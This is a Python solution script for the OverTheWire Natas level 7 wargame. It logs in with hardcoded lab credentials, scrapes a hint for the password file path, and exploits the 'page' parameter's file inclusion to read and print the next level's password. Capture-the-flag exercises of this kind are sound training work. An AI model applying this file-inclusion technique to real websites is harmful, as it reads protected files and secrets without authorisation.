import requests, re
from requests.auth import HTTPBasicAuth

HOST = 'http://natas7.natas.labs.overthewire.org/index.php?page=about'
KEYWORD = 'natas8'
PATTERN = re.compile("^([A-Za-z0-9]{32})$")

def get_path(host, credentials):
    """
    This will serve up the path to the password
    using some basic scraping techniques
    :param host:
    :param credentials:
    :return: The path to the password
    """

    try:
        response = requests.get(host, auth=HTTPBasicAuth(*credentials))
        response_lines = response.content.split('\n')
        return next((line.split()[-2:][0] for line in response_lines if 'hint'in line),
                    "Couldn't find hint...")
    except requests.RequestException as e:
        print(e)
def exploit(host, credentials):
    """
    :param host:
    :param credentials:
    :return:
    """

    try:
        response = requests.get(host, auth=HTTPBasicAuth(*credentials))
        response_lines = response.content.decode('ascii').split('\n')
        return next((line for line in response_lines if PATTERN.match(line)),
                    "Couldn't find the password...")

    except requests.RequestException as e:
        print(e)

def main():
    global HOST
    credentials = ('natas7', '7z3hEENjQtflzgnT29q7wAvMNfZdh0i9')
    path = get_path(HOST, credentials)
    HOST = (HOST.split('='))
    HOST = HOST[0] + '=' + path
    print(KEYWORD + ":" + exploit(HOST, credentials))

if __name__ == '__main__':
    main()